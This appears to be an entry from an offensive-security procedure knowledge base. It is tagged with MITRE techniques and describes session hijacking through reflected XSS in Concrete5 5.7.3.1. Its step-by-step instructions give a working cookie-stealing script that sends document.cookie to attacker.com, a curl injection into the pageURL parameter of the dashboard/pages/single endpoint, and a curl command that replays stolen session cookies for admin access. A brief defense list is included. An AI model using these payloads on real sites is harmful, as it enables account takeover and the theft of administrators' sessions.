---
id: proc-xss-session-hijack-001
tags:
  - xss
  - session-hijacking
  - cookie-theft
  - concrete5
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-exfil-cookies]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T03:15:31.932Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Execute-Payload-for-Session-Hijacking

## Summary

This procedure uses exploited XSS in Concrete5 to execute JavaScript that steals session cookies and exfiltrates them to an attacker server, enabling session replay for admin takeover.

## Description

Building on reflected XSS, replace benign alerts with data-stealing scripts like document.cookie sent via fetch to a controlled domain. In Concrete5 context, this targets authenticated sessions in admin areas, leading to full compromise. Requires prior XSS confirmation; outcomes include stolen credentials for persistent access.

## Requirements

1. Confirmed XSS vector (e.g., pageURL parameter)
2. Attacker-controlled server for exfil (e.g., ngrok or VPS)
3. Victim interaction via crafted link

## Defense

Defensive measures and detection strategies:

- Enforce HttpOnly and Secure flags on session cookies
- Implement referrer checks and CORS policies
- Log and alert on anomalous outbound requests from admin pages

## Objectives

1. Steal session tokens via JS
2. Exfiltrate to attacker
3. Replay for unauthorized access

## Instructions

### Step 1: Craft Exfil Payload

**Context**: Modify XSS payload to capture and send cookies.

Prepare payload: <script>fetch('https://attacker.com/steal?data='+btoa(document.cookie))</script>

Inject via vulnerable endpoint like dashboard/pages/single.

### Step 2: Deliver and Execute

**Context**: Trick victim into loading the payload.

Use [[commands/curl-exfil-cookies]] to test delivery:

```bash
curl -X POST -d 'pageURL="--></style></scRipt><scRipt>fetch("https://attacker.com/steal?cookie="+document.cookie)</scRipt>' https://target.com/concrete5.7.3.1/index.php/dashboard/pages/single
```

> Expected: When victim accesses, request hits attacker server with cookies.

### Step 3: Replay Stolen Session

**Context**: Use exfiltrated cookies to impersonate victim.

Import cookies into browser dev tools or use curl with -b flag to access admin.

```bash
curl -b 'CMS_SESSION=stolen_value; other=cookie' https://target.com/concrete5.7.3.1/index.php/dashboard
```

> Expected: Successful admin dashboard access.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used

- [[commands/curl-exfil-cookies]]

## Tools Used


## Tags

- xss
- session-hijacking
- cookie-theft
